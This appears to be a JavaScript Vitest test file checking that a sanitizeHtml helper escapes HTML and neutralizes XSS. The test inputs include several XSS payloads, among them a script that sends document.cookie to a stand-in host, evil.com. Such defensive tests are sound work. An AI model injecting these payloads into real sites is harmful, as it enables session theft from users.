import { describe, it, expect } from 'vitest';
import { sanitizeHtml } from '../src/utils/helpers.js';

describe('XSS Sanitization - sanitizeHtml Regression Tests', () => {
  it('should escape ampersands', () => {
    expect(sanitizeHtml('a & b')).toBe('a &amp; b');
  });

  it('should escape angle brackets', () => {
    expect(sanitizeHtml('<div>')).toBe('&lt;div&gt;');
  });

  it('should escape double quotes', () => {
    expect(sanitizeHtml('"quoted"')).toBe('&quot;quoted&quot;');
  });

  it('should escape single quotes', () => {
    expect(sanitizeHtml("'quoted'")).toBe('&#039;quoted&#039;');
  });

  it('should neutralize basic XSS injection', () => {
    const payload = '<script>alert("xss")</script>';
    const sanitized = sanitizeHtml(payload);
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).toContain('&lt;script&gt;');
  });

  it('should neutralize event handler XSS by escaping brackets', () => {
    const payload = '<img src=x onerror=alert(1)>';
    const sanitized = sanitizeHtml(payload);
    // sanitizeHtml escapes < and > so the browser won't parse it as HTML
    expect(sanitized).toContain('&lt;');
    expect(sanitized).toContain('&gt;');
    expect(sanitized).not.toContain('<img');
  });

  it('should neutralize javascript protocol XSS', () => {
    const payload = '<a href="javascript:alert(1)">click</a>';
    const sanitized = sanitizeHtml(payload);
    expect(sanitized).toContain('&lt;a');
  });

  it('should handle mixed HTML entities and tags', () => {
    const input = '<b>Bold</b> & <i>Italic</i>';
    const result = sanitizeHtml(input);
    expect(result).toBe('&lt;b&gt;Bold&lt;/b&gt; &amp; &lt;i&gt;Italic&lt;/i&gt;');
  });

  it('should pass through plain text unchanged', () => {
    expect(sanitizeHtml('Hello, World!')).toBe('Hello, World!');
  });

  it('should handle empty string', () => {
    expect(sanitizeHtml('')).toBe('');
  });

  it('should not allow script injection in product descriptions', () => {
    const maliciousDesc = 'Engine oil <script>document.location="http://evil.com/?cookie="+document.cookie</script> for sale';
    const sanitized = sanitizeHtml(maliciousDesc);
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).toContain('&lt;script&gt;');
  });
});
